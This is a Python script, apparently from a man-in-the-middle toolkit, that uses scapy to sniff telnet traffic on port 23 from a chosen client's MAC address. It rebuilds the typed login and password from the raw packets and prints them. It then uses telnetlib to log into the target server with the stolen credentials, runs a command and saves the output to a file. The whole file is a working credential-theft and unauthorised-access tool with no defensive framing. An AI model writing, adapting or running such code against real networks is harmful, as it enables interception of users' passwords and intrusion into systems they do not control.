from scapy.all import *
import telnetlib
from .utils import get_mac
from pip._vendor.distlib.compat import raw_input

login = []
password = []
counter = 0

try:
    interface = raw_input("Enter Desired Interface [eth0]: ")
    if interface == "":
        interface = "eth0"
    target1_ip = raw_input("[*] Enter Client IP: ")
    target2_ip = raw_input("[*] Enter Server IP: ")
except KeyboardInterrupt:
    print("\n[*] User Requested Shutdown")
    print("[*] Exiting...")
    sys.exit(1)


def get_telnet_credentials(pkt):
    global counter
    global login
    global password

    try:
        pkt.getlayer(Raw).load

    except:
        return

    payload = str(pkt.getlayer(Raw).load)
    if payload != "b'\\r\\x00'" and counter == 1:
        login.append(payload[2])
        return

    elif payload != "b'\\r\\x00'" and counter == 2:
        password.append(payload[2])
        return

    elif payload == "b'\\xff\\xfd\\x01'":
        counter = 1
        return

    elif payload == "b'\\r\\x00'":
        counter = counter + 1
        if counter == 3:
            use_telnet_credentials(login, password)
        else:
            return
    else:
        return


def use_telnet_credentials(login, password):
    global target2_ip
    
    str_login = ""
    str_password = ""
    
    for i in login:
        str_login = str_login + i
    for j in password:
        str_password = str_password + j
        
    print("user login: " + str_login + "| user password: " + str_password)
    
    try:
        tn = telnetlib.Telnet(target2_ip)
        tn.read_until(b"login: ",2)
        tn.write(str_login.encode('ascii') + b"\n")
        tn.read_until(b"Password: ",2)
        tn.write(str_password.encode('ascii') + b"\n")
        tn.write(b"ls\n")
        tn.write(b"exit\n")
        read_data = tn.read_all()
        with open('output_data.txt', 'w') as output:
            output.write(str(read_data))
    except:
        print("telnet connection with remote server couldn't be established")


client_mac = get_mac(target1_ip)
sniff(iface=interface, prn=get_telnet_credentials, filter='dst port 23 and ether src {}'.format(client_mac), store=0,
      count=0)
